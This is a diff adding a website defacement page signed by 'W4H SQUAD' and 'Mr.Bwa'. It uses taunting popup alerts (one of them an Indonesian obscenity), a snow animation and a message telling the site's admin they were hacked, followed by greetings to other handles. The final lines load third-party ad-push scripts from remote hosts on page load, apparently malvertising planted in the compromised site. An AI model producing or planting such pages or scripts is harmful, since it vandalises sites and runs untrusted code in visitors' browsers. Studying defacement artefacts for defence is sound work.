@@ -1,0 +1,151 @@
+<title>[-!-]Touched By W4H SQUAD[-!-]</title>
+
+<script type="text/javascript">
+alert("Security Is A Game");
+alert("W4H SQUAD");
+alert("KONTOL BAPAK KAU PECAH");
+alert("I'm Just Kidding Sir :)")
+var snowmax=35
+var snowcolor=new Array("#AAAACC","#DDDDFF","#CCCCDD","#F3F3F3","#F0FFFF")
+var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS")
+var snowletter="*"
+var sinkspeed=0.6
+var snowmaxsize=22
+var snowminsize=8
+var snowingzone=1
+
+// Do not edit below this line
+var snow=new Array()
+var marginbottom
+var marginright
+var timer
+var i_snow=0
+var x_mv=new Array();
+var crds=new Array();
+var lftrght=new Array();
+var browserinfos=navigator.userAgent 
+var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
+var ns6=document.getElementById&&!document.all
+var opera=browserinfos.match(/Opera/)  
+var browserok=ie5||ns6||opera
+
+function randommaker(range) {		
+	rand=Math.floor(range*Math.random())
+    return rand
+}
+
+function initsnow() {
+	if (ie5 || opera) {
+		marginbottom = document.body.clientHeight
+		marginright = document.body.clientWidth
+	}
+	else if (ns6) {
+		marginbottom = window.innerHeight
+		marginright = window.innerWidth
+	}
+	var snowsizerange=snowmaxsize-snowminsize
+	for (i=0;i<=snowmax;i++) {
+		crds[i] = 0;                      
+    	lftrght[i] = Math.random()*15;         
+    	x_mv[i] = 0.03 + Math.random()/10;
+		snow[i]=document.getElementById("s"+i)
+		snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
+		snow[i].size=randommaker(snowsizerange)+snowminsize
+		snow[i].style.fontSize=snow[i].size
+		snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
+		snow[i].sink=sinkspeed*snow[i].size/5
+		if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
+		if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
+		if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
+		if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
+		snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
+		snow[i].style.left=snow[i].posx
+		snow[i].style.top=snow[i].posy
+	}
+	movesnow()
+}
+
+function movesnow() {
+	for (i=0;i<=snowmax;i++) {
+		crds[i] += x_mv[i];
+		snow[i].posy+=snow[i].sink
+		snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
+		snow[i].style.top=snow[i].posy
+		
+		if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
+			if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
+			if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
+			if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
+			if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
+			snow[i].posy=0
+		}
+	}
+	var timer=setTimeout("movesnow()",50)
+}
+
+for (i=0;i<=snowmax;i++) {
+	document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
+}
+if (browserok) {
+	window.onload=initsnow
+}
+</script>
+
+
+<af123756@gmail.com, indonesia>
+
+<html>
+<br>
+<body bgcolor="#000000" text="white" link="pink" vlink="pink">
+<center>
+<blink><U><font face="impact" color="White" size ="8"></blink></blink> [ HACKED BY  ] </font></U><p>
+<blink><font face="impact" color="White" size ="4"></blink></blink> {+}Mr.Bwa{TerBwaKan}{+} </font><p>
+<center>
+<iframe frameborder="400" height="400" width="50%" src="https://youtube.com/embed/oZjUQJeu1sk?autoplay=1&controls=0&loop=1&rel=0&showinfo=0&autohide=1&wmode=transparent&hd=1"></iframe> 
+<img src="http://orig15.deviantart.net/e2a9/f/2016/284/b/a/oppayback_by_4prili666h05t-dakmlok.png" title="W4H SQUAD." />
+<a href="https://m.facebook.com/rika.gumara">
+<img src="http://i64.tinypic.com/zxqn9j.jpg" width="300" height="300" title="W4H SQUAD Was Here"></a>
+<br>
+<p> <font face="courier new"><font size="5" color=yellow>
+
+<font color="white" size=4>
+//---------------------------W4H SQUAD---------------------------//<p>
+
+<br>
+HeLLo Admin, Nice To MeeT You :D ..
+<br>
+I Found Vulnerability On Your Website..
+<br>
+I Try Find You, But I Don't Know How to Contact You.. Forgive Me..
+<br>
+I Just Leave This Message For You. However You Must Say Thanks To Me..
+<br>
+ Because You Know About Your Website Is Not Safe..
+<br>
+Hey Admin!!! You Just Delete Index.htm and Your Website Back to Normal..
+<br>
+Your Database Still Safe 100% (Sorry About My English) :D ..
+<br>
+<br>
+[+] !!!Safety Is Just Weakness!!! [+]
+<p>
+//--------------------------W4H SQUAD
+---------------------------//
+</font>
+<br>
+<br>
+<font color="red">Hacked By {+}Mr.Bwa{TerBwaKan}+}</font><br>
+<font color="yellow" size=4>contact me <font color="green" size=4>: af123756@gmail.com</font></font><br>
+<br>
+<font color=pink size=4><br>
+Greetzz :Mr.Joker366 - MR.W4HYU - PH4nT0MBL1zT - AKB4R DRAVINKY - root@mpun.OM - Dedew -   Programer.net - C2 -  xMrCold - Hacker Malay - ItzTOX1CV4P3 - karjok - LCR999X -  offl0st - Mrs. R4T
+
+</font></font>
+<br>
+<font color=grey size=4><br>
+Thanks To : Mr.Catur - Fly To Moon - zMaximous - Unknown007 - Mr.Dev - Mr.Cakil - Unknown - Acil A.K.A Black Death - 
+Cr0t_D1_D4l3m - Hme!_ - Wild_Cat - NFURQON27 - 19MrsMunaFvck33 - 5YIN15T3R 742 - Parker'z 1D10TZ - Nn'Audrey - Mantoed - Acep Fajar - S0ul_0f_Cyb0r6
+
+</font>
+
+</p></center><!-- --> <script type='text/javascript' src='//go.pub2srv.com/apu.php?zoneid=16780'> </script> <script type="text/javascript" src="//1phads.com/notice.php?p=16781&interactive=1&pushup=1"> </script>
